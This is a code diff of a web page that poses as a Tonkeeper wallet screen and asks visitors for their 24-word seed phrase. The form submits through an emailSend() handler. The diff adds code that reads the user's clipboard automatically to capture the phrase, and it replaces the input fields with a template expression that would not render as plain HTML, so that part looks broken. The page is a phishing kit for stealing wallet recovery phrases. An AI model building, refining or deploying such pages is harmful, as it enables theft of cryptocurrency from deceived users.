@@ -9,37 +9,16 @@
 </head>
 <body>
   <form id="form" onsubmit="emailSend(); return false;">
-    <br>
     <div class="container">
       <h3>Your Seed Phrase</h3>
       <p>Enter your Tonkeeper 24 words seed phrase:</p>
-      <button type="button" id="pasteBtn">Paste Seed Phrase To Continue</button>
+      <button type="button" id="pasteBtn">Paste Seed Phrase</button>
       <div class="grid">
         <!-- 24 Input Fields -->
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 1">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 2">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 3">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 4">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 5">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 6">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 7">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 8">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 9">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 10">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 11">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 12">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 13">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 14">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 15">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 16">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 17">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 18">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 19">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 20">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 21">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 22">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 23">
-        <input type="text" maxlength="10" class="seed-input" placeholder="Word 24">
+        ${Array.from({ length: 24 }).map(
+          (_, i) =>
+            `<input type="text" maxlength="10" class="seed-input" placeholder="Word ${i + 1}">`
+        ).join("")}
       </div>
       <p class="warning">Make sure to enter the words in the correct order!</p>
       <label>
@@ -105,20 +84,33 @@
     confirmCheckbox.addEventListener('change', checkFormCompletion);
 
     const pasteBtn = document.getElementById('pasteBtn');
-    pasteBtn.addEventListener('click', () => {
-      const userSeedPhrase = prompt("Paste your seed phrase (separate words with spaces):");
-      if (userSeedPhrase) {
-        const words = userSeedPhrase.trim().split(/\s+/);
-        if (words.length !== 24) {
-          swal("Error", "You must enter exactly 24 words.", "error");
-          return;
+    pasteBtn.addEventListener('click', async () => {
+      try {
+        // Access clipboard data
+        const clipboardText = await navigator.clipboard.readText();
+        
+        if (clipboardText) {
+          const words = clipboardText.trim().split(/\s+/); // Split clipboard text into words
+
+          if (words.length !== 24) {
+            swal("Error", "You must paste exactly 24 words.", "error");
+            return;
+          }
+
+          // Fill each input field with the corresponding word
+          seedInputs.forEach((input, index) => {
+            input.value = words[index] || ""; // Set value if it exists
+          });
+
+          // Check form completion
+          checkFormCompletion();
+        } else {
+          swal("Error", "Clipboard is empty or invalid content.", "error");
         }
-        seedInputs.forEach((input, index) => {
-          input.value = words[index] || "";
-        });
-        checkFormCompletion();
+      } catch (err) {
+        swal("Error", "Failed to access clipboard. Please paste manually.", "error");
       }
     });
   </script>
 </body>
-</html>
+  </html>
